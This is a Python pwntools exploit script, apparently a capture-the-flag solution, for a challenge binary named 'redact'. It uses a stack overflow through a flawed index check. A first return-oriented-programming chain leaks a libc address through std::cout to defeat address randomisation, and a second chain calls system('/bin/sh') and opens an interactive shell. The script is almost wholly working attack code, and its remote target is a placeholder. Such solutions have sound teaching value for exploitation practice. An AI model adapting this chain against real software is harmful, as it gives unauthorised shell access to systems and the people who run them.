#!/usr/bin/env python3

from pwn import *

exe = ELF("./redact")
libc = ELF("./libc-chall.so.6")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    rop = ROP(exe)

    # NOTE: index > text.size() - placeholder.size() check is completely wrong if text.size() < placeholder.size()
    pop_rdi     = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

    # ostream to print stuff: _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
    # RDI: std::cout@GLIBCXX_3.4    (_ZSt4cout@GLIBCXX_3.4 in symbols dictionary)
    # RSI: string to print

    payload  = b"A" * 72
    payload += p64(pop_rdi) + p64(exe.symbols["_ZSt4cout@GLIBCXX_3.4"])
    payload += p64(pop_rsi_r15) + p64(exe.got["__libc_start_main"]) + p64(0)
    payload += p64(exe.symbols["_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc"])
    payload += p64(exe.symbols["main"])

    # If the string is too long, getline() will allocate memory from the heap.
    # Apparently 8 bytes is the maximum size to "force" the string on the stack.
    # With this in mind, we can overwrite stuff on the stack and proceed to pivot the program.
    r.sendlineafter(b"text: ", b"")
    r.sendlineafter(b"placeholder: ", payload)
    r.sendlineafter(b"redact: ", b"0")

    libc.address = int.from_bytes(r.recvuntil(b"Enter", drop = True).strip(), byteorder = "little") - libc.symbols["__libc_start_main"]
    log.info(f"LIBC Address : 0x{libc.address:x}")

    payload  = b"A" * 72
    payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
    payload += p64(libc.symbols["system"])

    r.sendlineafter(b"placeholder: ", payload)
    r.sendlineafter(b"redact: ", b"0")

    r.interactive("$ ")


if __name__ == "__main__":
    main()
